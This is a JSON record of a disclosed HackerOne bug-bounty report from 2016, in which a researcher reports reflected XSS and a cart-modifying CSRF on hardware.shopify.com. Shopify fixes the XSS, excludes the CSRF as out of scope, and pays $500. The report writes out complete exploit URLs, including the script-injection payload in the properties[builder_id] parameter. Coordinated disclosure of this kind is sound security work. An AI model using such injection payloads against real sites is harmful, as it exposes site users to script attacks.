{"id":116006,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTYwMDY=","url":"https://hackerone.com/reports/116006","title":"XSS on hardware.shopify.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-02-11T22:24:58.916Z","submitted_at":"2016-02-11T22:24:58.916Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mdv","url":"/mdv","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-03-01T06:18:34.752Z","bug_reporter_agreed_on_going_public_at":"2016-03-01T05:30:02.003Z","team_member_agreed_on_going_public_at":"2016-03-01T06:18:34.568Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello @Shopify.\nI found CSRF and XSS, that very good combine with each other.\n### CSRF\nThis CSRF is not dangerous, but is serves me in order to perform other bugs.\nFor example, here CSRF for adding product:\n```\nhttp://hardware.shopify.com/cart/add?\u0026id=1106494145\u0026iPad Stand=1120276481\u0026Cash Drawer=1120176153\u0026Receipt Printer=1120166789\u0026attributes[cart_exists]=true\u0026properties[builder_id]=shapp_options_421549285_1455208671885\u0026properties[master_builder]=1\u0026properties[test]=test\u0026properties[value]=11\u0026add\n```\nWorks with GET and POST requests, which greatly simplifies the work.\n### XSS\nTo reproduce this XSS, visit this link:\n```\nhttp://hardware.shopify.com/cart/add?id=1106494145\u0026iPad Stand=1120276481\u0026Cash Drawer=1120176153\u0026Receipt Printer=1120166789\u0026attributes[cart_exists]=true\u0026properties[builder_id]=shapp_options_421549285_1455208671885%27%29%3Balert%28%27XSS\u0026properties[master_builder]=1\u0026properties[test]=test\u0026properties[value]=11\u0026add\n```\nAnd click \"Remove\" in attached product.\nVulnerable parameter: `properties[builder_id]`\nFor this XSS i used `');alert('XSS`","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":73176,"file_name":"XSS.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/073/176/5994095108600e64713e793760bf1f886f3deda2/XSS.png?response-content-disposition=attachment%3B%20filename%3D%22XSS.png%22%3B%20filename%2A%3DUTF-8%27%27XSS.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUWIS6VCD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132834Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQD5qsiIq7Ck1i9U3MTr1Jo1%2F3EDxH2PPmsZwQtKB8ZKHgIhAJ3GPiydxb4RL1gx8xsJzOsLrxI5jwwj0tTnFObt0P14KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgzIOEXrWQ9u1AQUX0Uq1wOcZjaNugHMVKWeqymcjzBFh6Y1k6CMr8RU%2By%2FCZ4rv9GZiC2wT8OmGhsgt00HKgFWK1MpUtynFdgo25n2Z3Hw%2BIbYI8vc1JJdIjhuurHucoJNgsKCs02JzKj8GyJUC61pv0yaDJyGUVPN694UkMEyn%2FPWTQr%2BUTeBhbmczKhCGUj%2FpPN2iIbYsRZixR6LxxOf2cvjX2jSZkAk%2FSVsApfA8g%2BhlsBjDUA9%2B8YRWNjxfWtxQ%2Foo1xWaWyO6R0C2NxkUOjfjpECLEYEQ7vJ%2Bmu27ctvQxX8DIgxS97NsRC7LzasVsLHVmntXBAZ7PuEI4sWc5xs%2Fk66Q906%2BB%2BzvloL3Axk31g5hiymuem0csQnadqDxLt8p2LjIDw8YcQPN5NH0kGSb6mQrkldEFgJqP84RMAJRIxUJWDd%2B%2BPuzQFsioIExGAI0yAK1L2jOitJOooOZlWfFIzjDUn7dj9xSziPydE91tqmI514stzkBU2GFbRIrklzPo3g7n0zD%2FNL7OLEHlmYWBTM9ot%2B6bu4Bck8DrV4VVi9QHnC5ukEnqLU7NSIQGPaibC1SdOVjM2Iv6X9PdR0rR6F07TM%2FRs9G%2B%2BYIK1kHXDHgTN6Tqa9Kn%2B8BfoEt%2BZqnCJGYwv%2ByQiwY6pAFugzNge1CtFW4ATDcRX3hNOdndjPYZIsRGJutSgqHjCwxt8awsI7yZQ6vRxlp6LSSmoSK%2BkQ3evRcXC09cJ%2F1e4JrEeYASE3WVsCxAQVnPVIMtkim2T%2BFMB87kfQL6qAH6iiBO2KVli0mZ4%2BX%2ByxoxRVipnwQh%2B2l8LEnW1ug4kWwPqBp1%2F3G0D3IViaM%2F6KEe0O675l3jsd9YY%2BgtdY9L6zl0yg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2c3876fe2a15e15cf23d57bf65f2aef45df62f6235a6d0b29ea801b0daebd5a1","file_size":463708,"type":"image/png"}],"allow_singular_disclosure_at":"2016-03-31T05:30:02.204Z","allow_singular_disclosure_after":-174556712.37829617,"singular_disclosure_allowed":true,"vote_count":1,"voters":["drsniper"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":800221,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. Our engineering team is investigating the issue.","automated_response":false,"created_at":"2016-02-16T19:58:32.745Z","updated_at":"2016-02-16T19:58:32.745Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":801860,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. We recently rolled out a fix for the cross-site scripting issue.\n\nAs you pointed out, modifying the cart via CSRF is not dangerous on its own, and is in fact required for some features of the Shopify platform to function correctly. For that reason, it's excluded from our white hat program, as listed on our [program page](https://hackerone.com/shopify) and we don't plan to make any changes.\n\nOur next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon. Thank you for your interest in improving the security of Shopify!","automated_response":false,"created_at":"2016-02-17T19:08:32.273Z","updated_at":"2016-02-17T19:08:32.273Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mdv","url":"/mdv"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":817997,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify. This issue has been resolved.","automated_response":false,"created_at":"2016-03-01T00:50:25.216Z","updated_at":"2016-03-01T00:50:25.216Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"mdv","url":"/mdv"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":818239,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you for a bounty.","automated_response":false,"created_at":"2016-03-01T05:30:02.031Z","updated_at":"2016-03-01T05:30:02.031Z","first_to_agree":true,"actor":{"username":"mdv","cleared":false,"url":"/mdv","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":818259,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-03-01T06:18:34.592Z","updated_at":"2016-03-01T06:18:34.592Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":818260,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-03-01T06:18:34.771Z","updated_at":"2016-03-01T06:18:34.771Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":818261,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2016-03-01T06:19:23.227Z","updated_at":"2016-03-01T06:19:23.227Z","additional_data":{"old_title":"CSRF and XSS on hardware.shopify.com","new_title":"XSS on hardware.shopify.com"},"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1164631,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2016-08-31T12:55:56.663Z","updated_at":"2018-02-28T13:10:45.464Z","additional_data":{"added_weaknesses":[],"removed_weaknesses":[{"id":45,"name":"Cross-Site Request Forgery (CSRF)"}]},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}